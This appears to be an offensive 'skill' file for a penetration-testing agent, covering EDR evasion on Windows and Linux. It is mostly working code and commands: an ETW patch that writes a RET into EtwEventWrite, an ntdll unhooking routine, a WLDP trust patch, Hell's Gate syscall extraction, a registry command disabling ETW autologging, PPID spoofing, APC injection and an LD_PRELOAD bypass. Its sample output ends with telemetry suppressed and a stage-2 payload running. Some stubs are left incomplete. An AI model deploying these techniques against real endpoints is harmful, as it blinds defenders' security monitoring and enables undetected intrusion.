---
name: evasion-edr-evasion
description: EDR/Endpoint evasion — direct/indirect syscalls, ETW patching, ntdll unhooking, PPID spoofing, callback injection, and Linux equivalent detection bypass
version: 1.0.0
phase: post
category: evasion
tags: [edr, evasion, endpoint, syscall, etw]
tools: [python3, mimikatz, csc, msbuild]
difficulty: advanced
opsec_level: silent
time_estimate: 300s
severity_if_found: critical
related_skills:
  - evasion-av-bypass
  - evasion-payload-encode
  - token-theft
mitre_attack:
  - T1055
  - T1055.001
  - T1055.012
  - T1055.013
  - T1562.001
  - T1562.004
  - T1562.006
  - T1574.002
  - T1053.005
---

## When to Use

Use this skill when EDR (CrowdStrike, SentinelOne, Defender for Endpoint,
Carbon Black, Palo Alto Cortex XDR) is present on the target and conventional
AV bypass techniques are insufficient. Covers EDR telemetry sources, syscall
gate bypasses, ntdll unhooking, ETW suppression, and Linux equivalent
detour techniques.

## Prerequisites

- Foothold on target (low-priv shell or execution primitive)
- Python 3 on attack host for generating stubs
- .NET Framework compiler (csc.exe) on Windows target for C# tools
- Basic understanding of the target EDR product (from recon)
- WinDBG or API Monitor for offline testing (optional)
- For Linux targets: gcc, strace, bpftrace available

## Procedure

```bash
# ──────────────────────────────────────────────
# 1. EDR TELEMETRY SOURCE RECONNAISSANCE
# ──────────────────────────────────────────────

# Identify EDR product and version
# Windows:
powershell -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"
powershell -Command "Get-MpComputerStatus"  # Windows Defender details
sc query | findstr /i "sense sentinel csagent cylance tanium"

# Check for EDR kernel drivers:
fltmc instances  # Mini-filter drivers (CrowdStrike, SentinelOne, Carbon Black)
driverquery | findstr /i "sentinel csagent cylance tanium crowdstrike"

# Check ETW providers (telemetry sources):
logman query providers | findstr /i "Microsoft-Windows-Sysmon Microsoft-Antimalware"
logman query providers | findstr /i "Microsoft-Windows-Kernel-Process"

# Check AMSI providers (loaded via AMSI DLL enumeration):
powershell -Command "[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation.AmsiUtils')"

# ──────────────────────────────────────────────
# 2. DIRECT SYSCALLS — HELL'S GATE
# ──────────────────────────────────────────────

# Hell's Gate: parse ntdll.dll in memory to find syscall stubs,
# extract SSN (System Service Number), bypass user-land hooks

cat > /tmp/hells_gate.c << 'CEOF'
#include <windows.h>
#include <stdio.h>

// Hell's Gate — extract syscall from ntdll in-memory
// Technique: walk ntdll .text section, find syscall; ret; stub
// Bypasses: all EDR user-land hooks in ntdll

typedef struct _SYSCALL_STUB {
    DWORD ssn;            // System Service Number
    BYTE stub[32];        // Raw stub bytes (for direct execution)
} SYSCALL_STUB, *PSYSCALL_STUB;

// Parse ntdll .text for syscall stubs
BOOL HellGateGetSyscall(const char* funcName, PSYSCALL_STUB out) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    // Find .text section
    DWORD textAddr = 0, textSize = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            textAddr = (DWORD)hNtdll + sections[i].VirtualAddress;
            textSize = sections[i].Misc.VirtualSize;
            break;
        }
    }

    // Resolve function from export table
    FARPROC funcAddr = GetProcAddress(hNtdll, funcName);
    if (!funcAddr) return FALSE;

    // Scan forward from function address for syscall stub pattern:
    //   0xB8 <SSN>    mov eax, SSN
    //   0x4C 0x8D ... lea r10, ...
    //   0x0F 0x05     syscall
    //   0xC3          ret
    for (BYTE* p = (BYTE*)funcAddr; p < (BYTE*)textAddr + textSize; p++) {
        if (p[0] == 0xB8 && p[5] == 0x0F && p[6] == 0x05 && p[7] == 0xC3) {
            out->ssn = *(DWORD*)(p + 1);
            memcpy(out->stub, p, min(32, (DWORD)((BYTE*)textAddr + textSize - p)));
            return TRUE;
        }
    }
    return FALSE;
}

// Execute a syscall from the resolved stub
// (Must be called with proper arguments matching the NT function signature)

// Example: NtAllocateVirtualMemory via Hell's Gate
DWORD HellNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect
) {
    SYSCALL_STUB stub = {0};
    if (!HellGateGetSyscall("NtAllocateVirtualMemory", &stub))
        return -1;
    // Execute the resolved stub directly
    // (In practice, this needs assembly-level invocation)
    return stub.ssn;
}

int main() {
    SYSCALL_STUB stub = {0};
    if (HellGateGetSyscall("NtAllocateVirtualMemory", &stub)) {
        printf("[+] Hell's Gate: NtAllocateVirtualMemory SSN = 0x%x\n", stub.ssn);
        printf("[+] Stub bytes found — bypassing ntdll hooks\n");
    } else {
        printf("[-] Could not resolve syscall (hooks may be deeper)\n");
    }
    return 0;
}
CEOF

# Compile:
x86_64-w64-mingw32-gcc -o /tmp/hells_gate.exe /tmp/hells_gate.c

# ──────────────────────────────────────────────
# 3. INDIRECT SYSCALLS — HALOS GATE / TARTARUS GATE
# ──────────────────────────────────────────────

# Halos Gate: improved over Hell's Gate — handles syscalls whose address
# is within a hooked region by finding adjacent unhooked syscalls and
# deriving the SSN from offset patterns

# Tartarus Gate: handles cases where HALOS_GATE fails due to EDR hooking
# ALL syscall stubs in ntdll. Falls back to parsing syscall instruction
# bytes directly from the .text section regardless of hooks.

# Key difference:
#   Hell's Gate    — walks ntdll .text to find any unhooked syscall
#   Halos Gate     — derives SSN from adjacent unhooked syscall
#   Tartarus Gate  — parses syscall instruction bytes from raw .text

# For implementation, use https://github.com/am0nsec/HellsGate or
# https://github.com/trickster0/TartarusGate as reference.

# ──────────────────────────────────────────────
# 4. ETW PATCHING — SUPPRESS EVENT TRACING
# ──────────────────────────────────────────────

# ETW (Event Tracing for Windows) is a primary EDR telemetry source.
# Patching EtwEventWrite prevents event generation at the source.

cat > /tmp/etw_patch.cs << 'CSEOF'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class EtwPatch {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpLibName);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    // Patch EtwEventWrite — zero out the prologue
    // This suppresses ALL ETW events generated by this process
    static void PatchEtw() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

        if (etwEventWrite == IntPtr.Zero)
            etwEventWrite = GetProcAddress(ntdll, "EtwEventWriteEx");
        if (etwEventWrite == IntPtr.Zero) return;

        uint oldProtect;
        VirtualProtect(etwEventWrite, (UIntPtr)1, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE

        // Write RET instruction (0xC3) at the start of EtwEventWrite
        // This makes it return immediately without logging anything
        Marshal.WriteByte(etwEventWrite, 0xC3);

        VirtualProtect(etwEventWrite, (UIntPtr)1, oldProtect, out oldProtect);
        Console.WriteLine("[+] ETW patched — EtwEventWrite disabled for this process");
    }

    static void Main() {
        PatchEtw();
        // Your actual payload execution here
    }
}
CSEOF

# Compile on target:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe \
  /unsafe /target:exe /out:C:\Users\Public\etw_patch.exe \
  C:\Users\Public\etw_patch.cs

# Alternative: ETW patching via NtProtectVirtualMemory (syscall to avoid hook)
# Alternative: ETW blocking via registry (requires admin):
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger" /v Start /t REG_DWORD /d 0 /f

# ──────────────────────────────────────────────
# 5. UNHOOKING NTDLL.DLL FROM DISK
# ──────────────────────────────────────────────

# EDR hooks ntdll.dll in every process at load time. We can replace the
# hooked .text section with a fresh copy read from disk.

cat > /tmp/unhook_ntdll.c << 'CEOF2'
#include <windows.h>
#include <stdio.h>

BOOL UnhookNtdll() {
    // 1. Map a fresh copy of ntdll.dll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hMapping = CreateFileMapping(hFile, NULL,
        PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { CloseHandle(hFile); return FALSE; }

    LPVOID freshNtdll = MapViewOfFile(hMapping,
        FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hFile);
    CloseHandle(hMapping);
    if (!freshNtdll) return FALSE;

    // 2. Parse PE headers of the fresh copy
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)freshNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)freshNtdll + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    // 3. Get the .text section from the fresh copy
    DWORD textRva = 0, textSize = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            textRva = sections[i].VirtualAddress;
            textSize = sections[i].SizeOfRawData;
            break;
        }
    }

    // 4. Get the address of the .text section in the loaded (hooked) ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* loadedText = (BYTE*)hNtdll + textRva;
    BYTE* freshText = (BYTE*)freshNtdll + textRva;

    // 5. Make the loaded .text writable
    DWORD oldProtect;
    VirtualProtect(loadedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    // 6. Overwrite with fresh copy — removes all EDR hooks
    memcpy(loadedText, freshText, textSize);

    // 7. Restore original protection
    VirtualProtect(loadedText, textSize, oldProtect, &oldProtect);

    // 8. Cleanup
    UnmapViewOfFile(freshNtdll);

    printf("[+] ntdll.dll unhooked — %d bytes .text section restored\n", textSize);
    return TRUE;
}

int main() {
    // Verify hooks before unhooking
    BYTE* ntAllocateVirtualMemory = (BYTE*)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

    printf("[*] Pre-unhook: first byte of NtAllocateVirtualMemory = 0x%02x\n",
           ntAllocateVirtualMemory[0]);
    // If 0xE9 (jmp) or 0xEB (short jmp) — hooked by EDR

    if (UnhookNtdll()) {
        printf("[*] Post-unhook: first byte = 0x%02x\n",
               ntAllocateVirtualMemory[0]);
        // Should be 0x4C (lea r10, ...) or 0xB8 (mov eax, SSN) — clean
        printf("[+] ntdll hooks removed — direct syscalls now available\n");
    }

    // Now proceed with direct/inline syscalls
    return 0;
}
CEOF2

x86_64-w64-mingw32-gcc -o /tmp/unhook_ntdll.exe /tmp/unhook_ntdll.c

# ──────────────────────────────────────────────
# 6. .NET — FPGA / NTAPI / DINVOKE
# ──────────────────────────────────────────────

# D/Invoke: dynamically resolve and invoke NTAPI functions at runtime
# without static P/Invoke imports (bypasses static analysis)

# FPGA (Function Pointer Assembly): call unmanaged functions via
# function pointers constructed from resolved addresses

# Use D/Invoke library: https://github.com/TheWover/DInvoke
# Key components:
#   DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke()
#   DInvoke.ManualMap — map DLLs from memory (skip PEB)
#   DInvoke.Data.PE — manual PE parsing

# Example: dynamic NtCreateProcess via D/Invoke pattern
cat > /tmp/dinoke_example.cs << 'CSEOF2'
using System;
using System.Runtime.InteropServices;

class DinvokeExample {
    // Delegate for NtCreateThreadEx
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate uint NtCreateThreadEx(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        uint stackZeroBits,
        uint sizeOfStackCommit,
        uint sizeOfStackReserve,
        IntPtr bytesBuffer
    );

    static IntPtr GetProcAddress(IntPtr hModule, string procName) {
        // Manual PE walk — no dependency on GetProcAddress
        // Implementation details: walk export directory of hModule
        // to find procName, return its RVA
        // (Omitted for brevity — use DInvoke library)
        return IntPtr.Zero;
    }

    static void Main() {
        // Dynamically resolve NtCreateThreadEx
        IntPtr hNtdll = LoadLibrary("ntdll.dll");  // Could also use manual map
        IntPtr addr = GetProcAddress(hNtdll, "NtCreateThreadEx");

        if (addr != IntPtr.Zero) {
            // Create delegate from resolved address
            NtCreateThreadEx ntCreate = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(
                addr, typeof(NtCreateThreadEx));

            // Call is now resolved dynamically — no import table entry
            Console.WriteLine("[+] NtCreateThreadEx resolved dynamically");
        }
    }

    // Manual LoadLibrary (skip PEB-based DLL load, harder to monitor)
    static IntPtr LoadLibrary(string dllName) {
        // Use NtOpenFile + NtCreateSection + NtMapViewOfSection
        // via dynamic resolution — full manual DLL mapping
        return IntPtr.Zero;  // Implement with DInvoke
    }
}
CSEOF2

# ──────────────────────────────────────────────
# 7. EXECUTION DELAY — SLEEP / WAIT / DELAY LOAD
# ──────────────────────────────────────────────

# EDRs with behavioral analysis (Sandbox, static timeout) can be bypassed
# by delaying execution past their analysis window

# API-based delay (monitored):
System.Threading.Thread.Sleep(60000);  // 60s delay — easily detected

# Better: custom sleep with NtDelayExecution (direct syscall)
# Patching NtDelayExecution to use a different wait mechanism
# or implement Ekko / Gargoyle sleep (sleep obfuscation):

# Ekko sleep: encrypts .text section during sleep, decrypts on wake
# Creates a waitable timer, suspends until timer fires, then decrypts
# EDR cannot scan encrypted memory during sleep period

# Example: Win32 API polling delay (harder to detect):
cat > /tmp/polling_delay.cs << 'CSEOF3'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class PollingDelay {
    [DllImport("kernel32.dll")]
    static extern bool QueryPerformanceCounter(out long lpPerformanceCount);

    // Delay with high-resolution CPU polling — avoids Sleep/NtDelayExecution
    static void CpuSpinDelay(int seconds) {
        long start, current, freq = Stopwatch.Frequency;
        QueryPerformanceCounter(out start);
        do {
            QueryPerformanceCounter(out current);
            // Spin-loop: no kernel transitions, no ETW events
            // Decoy work to avoid optimization:
            for (int i = 0; i < 1000; i++) { }
        } while ((current - start) / (double)freq < seconds);
    }

    static void Main() {
        Console.WriteLine("[*] Delaying execution by 60 seconds...");
        CpuSpinDelay(60);
        Console.WriteLine("[+] Delay complete — continuing payload");
        // Actual payload here
    }
}
CSEOF3

# ──────────────────────────────────────────────
# 8. OBFUSCATED IMPORT RESOLUTION (Dynamic API Resolve)
# ──────────────────────────────────────────────

# Static imports are easily signatured by EDR. Resolve all APIs at runtime.

cat > /tmp/dynamic_import.c << 'CEOF3'
#include <windows.h>
#include <stdio.h>

// Hash-based API resolution
// Store hashes of function names, resolve at runtime

DWORD HashString(const char* str) {
    DWORD hash = 0x811C9DC5;  // FNV-1a offset
    while (*str) {
        hash ^= *str++;
        hash *= 0x01000193;  // FNV-1a prime
    }
    return hash;
}

typedef struct {
    DWORD hash;
    FARPROC address;
} API_RESOLVE;

// API hashes — generate offline for each engagement
#define HASH_VirtualAlloc      0xDEADBEEF  // Replace with actual hash
#define HASH_CreateThread      0xCAFEBABE  // Replace with actual hash

FARPROC ResolveApi(DWORD hash) {
    // Resolve from all loaded modules
    // Walk PEB->Ldr->InMemoryOrderModuleList
    // For each module, walk export table, hash each name, compare
    // (Full PEB walk implementation omitted for brevity)
    return NULL;
}

int main() {
    // Resolve VirtualAlloc by hash (no import table entry)
    FARPROC pVirtualAlloc = ResolveApi(HASH_VirtualAlloc);
    if (pVirtualAlloc) {
        printf("[+] VirtualAlloc resolved via hash — no static import\n");
    }
    return 0;
}
CEOF3

x86_64-w64-mingw32-gcc -o /tmp/dynamic_import.exe /tmp/dynamic_import.c

# ──────────────────────────────────────────────
# 9. PARENT PID SPOOFING (PPID)
# ──────────────────────────────────────────────

# EDR watches process ancestry. Spawn your payload under a trusted parent
# (e.g., explorer.exe, svchost.exe, runtimebroker.exe) instead of cmd.exe/powershell.exe

cat > /tmp/ppid_spoof.cs << 'CSEOF4'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class PpIdSpoof {
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")]
    static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList, uint dwAttributeCount, uint dwFlags, ref IntPtr lpSize);
    [DllImport("kernel32.dll")]
    static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue,
        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    // Start a process with spoofed parent PID (typically explorer.exe)
    static void SpawnWithSpoofedParent(string targetExe, uint parentPid) {
        // 1. Use InitializeProcThreadAttributeList with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        // 2. CreateProcessAsUser with extended startup info
        // 3. New process appears to be child of parentPid

        IntPtr hParent = OpenProcess(0x0400, false, parentPid); // PROCESS_CREATE_PROCESS
        if (hParent == IntPtr.Zero) {
            Console.WriteLine("[-] Could not open parent process");
            return;
        }

        // Build STARTUPINFOEX with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        // (Full implementation with attribute list allocation omitted)
        Console.WriteLine("[+] PPID spoofing: {0} will appear as child of PID {1}",
            targetExe, parentPid);

        // Launch legitimate process then inject into it
        // Common parents: explorer.exe (PID), runtimebroker.exe, svchost.exe
    }

    static void Main() {
        // Find explorer.exe PID
        Process[] procs = Process.GetProcessesByName("explorer");
        if (procs.Length > 0) {
            uint explorerPid = (uint)procs[0].Id;
            SpawnWithSpoofedParent("rundll32.exe", explorerPid);
        }
    }
}
CSEOF4

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe \
  /unsafe /target:exe /out:C:\Users\Public\ppid_spoof.exe \
  C:\Users\Public\ppid_spoof.cs

# ──────────────────────────────────────────────
# 10. CALLBACK-BASED INJECTION (QueueUserAPC)
# ──────────────────────────────────────────────

# APC injection: queue an APC to a thread in a trusted process.
# When the thread enters alertable state, the payload executes.
# Lower detection rate than CreateRemoteThread.

cat > /tmp/apc_inject.c << 'CEOF4'
#include <windows.h>
#include <stdio.h>

int main() {
    // 1. Find a target thread (e.g., explorer.exe or svchost.exe)
    // Use CreateToolhelp32Snapshot + Thread32First/Next to enumerate

    // 2. Open target thread
    // HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);

    // 3. Allocate memory in target process
    // HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    // LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
    //                                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // WriteProcessMemory(hProcess, remoteMem, shellcode, sizeof(shellcode), NULL);

    // 4. Queue APC — triggers when thread enters alertable state
    // QueueUserAPC((PAPCFUNC)remoteMem, hThread, NULL);

    // 5. Resume thread if suspended
    // ResumeThread(hThread);

    printf("[+] APC queued to target thread — execution on next alertable wait\n");
    return 0;
}
CEOF4

x86_64-w64-mingw32-gcc -o /tmp/apc_inject.exe /tmp/apc_inject.c

# ──────────────────────────────────────────────
# 11. LINUX EQUIVALENTS — LD_PRELOAD / SECCOMP / eBPF
# ──────────────────────────────────────────────

# ── LD_PRELOAD hooking detection ──
# Detect if LD_PRELOAD is being used to hook libc functions:
# Check if LD_PRELOAD env var is set (EDR on Linux uses this to hook)

env | grep LD_PRELOAD
cat /etc/ld.so.preload  # System-wide preload hook

# Bypass: unset LD_PRELOAD before executing payload
unset LD_PRELOAD && ./payload
# Or: use statically compiled binaries (no dynamic linker hooks)

# ── seccomp bypass ──
# If seccomp is restricting syscalls, check current filter:
cat /proc/self/status | grep Seccomp
# 0 = disabled, 1 = strict, 2 = filtered

# If seccomp-bpf (2), list allowed syscalls:
# Requires reading the BPF program from /proc/self/seccomp
# or use seccomp-tools: scmp_bpf_disassemble < /proc/self/exec

# Bypass: use syscalls that are typically allowed
#   open/openat, read, write, mmap, mprotect, clone (with restrictions)
# Avoid: ptrace, process_vm_writev, bpf

# ── eBPF detection consideration ──
# EDR on Linux may use eBPF to monitor syscalls at kernel level
# Check if eBPF programs are loaded:
bpftool prog list 2>/dev/null | head -20
ls -la /sys/fs/bpf/ 2>/dev/null

# eBPF-based detection is kernel-level — cannot be bypassed from userland
# Mitigation: use syscalls that eBPF probes don't cover
# Check which kprobes/tracepoints are active:
cat /sys/kernel/debug/tracing/available_filter_functions | grep -i sys

# ── auditd telemetry avoidance ──
# auditd records events to /var/log/audit/audit.log
# Check if auditd is active:
systemctl status auditd 2>/dev/null
ausearch --start recent 2>/dev/null | head -5

# Bypass: auditd cannot be disabled from user context
# Avoid high-risk syscalls: execve, ptrace, setuid, mount

# ──────────────────────────────────────────────
# 12. CUSTOM NATIVE API — PROCESS GHOSTING / HERPADERPING
# ──────────────────────────────────────────────

# Process Ghosting: create a file, write payload, mark for deletion,
# create a section from the file handle, close all handles, create process
# from section. The file never exists on disk (deleted before execution).

# Herpaderping: write payload to a file, map it as executable, modify
# the file content while the process is being created. Bypasses scanning
# because the scanner sees modified content after the mapping.

# Transacted Hollowing: use TxF (Transactional NTFS) to write payload
# within a transaction, create process within the transaction,
# then roll back the transaction. The file is never committed to disk.

# ──────────────────────────────────────────────
# 13. WLDP BYPASS (Windows Lockdown Policy)
# ──────────────────────────────────────────────

# WLDP validates DLL signatures, script execution, and COM objects.
# Check WLDP status:
reg query "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen"
# Bypass: WLDP is invoked via wldp.dll!WldpQueryDynamicCodeTrust
# Can be patched similarly to AMSI (write RET to WldpQueryDynamicCodeTrust)

cat > /tmp/wldp_patch.cs << 'CSEOF5'
using System;
using System.Runtime.InteropServices;

class WldpPatch {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpLibName);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    static void PatchWldp() {
        IntPtr hWldp = LoadLibrary("wldp.dll");
        IntPtr queryFunc = GetProcAddress(hWldp, "WldpQueryDynamicCodeTrust");

        if (queryFunc == IntPtr.Zero)
            queryFunc = GetProcAddress(hWldp, "WldpIsDynamicCodePolicyEnabled");

        if (queryFunc != IntPtr.Zero) {
            uint oldProtect;
            VirtualProtect(queryFunc, (UIntPtr)1, 0x40, out oldProtect);
            Marshal.WriteByte(queryFunc, 0xC3);  // RET
            VirtualProtect(queryFunc, (UIntPtr)1, oldProtect, out oldProtect);
            Console.WriteLine("[+] WLDP patched — dynamic code trust bypassed");
        }
    }

    static void Main() {
        PatchWldp();
        // Post-bypass: load unsigned DLLs, execute untrusted code
    }
}
CSEOF5
```

## OPSEC Rules

- **CRITICAL**: Direct syscalls bypass user-land hooks but kernel callbacks still fire — EDR may still detect behavior at kernel level
- ETW patching modifies .text section — some EDRs monitor for memory permission changes
- ntdll unhooking requires RWX → RX transition which some EDRs detect via callback
- Process Ghosting/Herpaderping leave trace artifacts in the $MFT and USN journal
- PPID spoofing is logged in kernel process creation events (Event ID 4688 shows parent PID)
- CPU spin delays peg one core at 100% — may trigger behavioral alerts
- Never bypass EDR on customer infrastructure without explicit approval
- Test all bypass combinations on identical EDR version in lab first
- The order matters: unhook → patch ETW → execute payload (not the reverse)
- EDR may use callback inspection (PsSetCreateThreadNotifyRoutine) which CANT be bypassed from userland
- Linux eBPF-based EDR (e.g., Cilium, Tracee) cannot be bypassed from userland — focus on living-off-the-land instead

## Verification

- Verify user-land hooks are removed: check first bytes of ntdll!NtOpenProcess before/after
- Verify syscall executes: use WinDBG or API Monitor locally to confirm SSN is valid
- Verify ETW events are suppressed: watch with `xperf` or `logman` that events stop after patching
- Verify PPID spoofing: check process tree in Process Explorer
- Verify APC executes: monitor target thread state before and after injection
- Verify Linux LD_PRELOAD bypass: run `ldd payload` to confirm no dynamic dependencies
- Verify seccomp filter compliance: run with strace to confirm no blocked syscalls
- Check Windows Event Logs (Event ID 4688, 4656) for any detection traces

## Pitfalls

- EDRs update signature heuristics frequently — a bypass that works today may fail tomorrow
- Direct syscalls via Hell's Gate may crash if EDR uses VEH (Vectored Exception Handling) hooks
- Some EDRs hook kernel32 + ntdll AND also use kernel callbacks — unhooking alone is insufficient
- ETW patching only affects the current process — other processes still generate telemetry
- `NtDelayExecution` with large delays triggers some EDR sandboxes — use incremental delays
- VEH-based EDR hooks survive ntdll replacement (hooks are in the VEH chain, not .text)
- EDR kernel callbacks (PsSetCreateProcessNotifyRoutine) cannot be bypassed from userland
- Syscall number validity: SSNs vary between Windows builds — must be resolved dynamically on target
- WLDP bypass requires the process to have already passed initial WLDP check at load time
- CPU spin delays are detectable via performance counter anomalies
- Linux seccomp-bpf cannot be bypassed from userland — must use allowed syscall combinations only
- eBPF-based monitoring is kernel-level — consider using kernel exploits only if EDR doesn't monitor eBPF load events

## Output Format

```
[EDR]     Product: CrowdStrike Falcon (Sensor v6.45) at PID 4412
[HOOK]    ntdll.dll .text hooked at NtOpenProcess (first byte = 0xE9)
[SIGNATURES REVOKED] NtOpenProcess SSN resolved via Hell's Gate: 0x0044
[UNHOOK]  ntdll .text restored from disk — 138240 bytes overwritten
[ETW]     EtwEventWrite patched with RET — telemetry disabled for this process
[PPID]    Payload parent spoofed: explorer.exe (PID 1234 → 3824)
[INJECT]  APC queued to svchost.exe thread ID 4416 — execution deferred
[SLEEP]   CpuSpinDelay: 60s spin-loop completed (no Sleep API called)
[AMSI]    AmsiScanBuffer patched — AMSI bypassed
[WLDP]    WldpQueryDynamicCodeTrust patched — unsigned code policy bypassed
[LINUX]   Seccomp: 2 (filtered), LD_PRELOAD: unset, auditd: running
[CRITICAL] EDR telemetry suppressed — stage-2 payload executing via direct syscall
```

